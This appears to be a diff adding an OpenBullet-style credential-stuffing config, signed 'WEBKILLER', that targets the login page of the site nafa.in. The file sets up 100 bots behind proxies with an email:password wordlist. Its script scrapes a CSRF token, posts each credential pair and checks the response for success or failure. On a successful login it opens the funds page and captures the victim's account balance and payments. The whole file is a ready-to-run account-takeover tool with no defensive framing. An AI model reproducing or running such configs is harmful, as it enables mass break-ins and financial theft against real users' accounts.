@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "nafa.in",
+  "SuggestedBots": 100,
+  "LastModified": "2018-11-10T15:06:06.1720154+00:00",
+  "AdditionalInfo": "",
+  "Author": "WEBKILLER",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#_csrf REQUEST GET "https://www.nafa.in/user/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#_csrf PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"_csrf\" value=\"" "\" />" Recursive=FALSE -> VAR "_csrf" "" "" 
+REQUEST POST "https://www.nafa.in/user/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&_csrf=<_csrf>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY " window.fcWidget.user.setFirstName" 
+REQUEST GET "https://www.nafa.in/funds" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "&#8377; " ". <br/> " Recursive=FALSE -> CAP "balance" "" "" 
+PARSE "<SOURCE>" LR "<h6>" "</h6>" Recursive=FALSE -> CAP "Payments" "" "" 
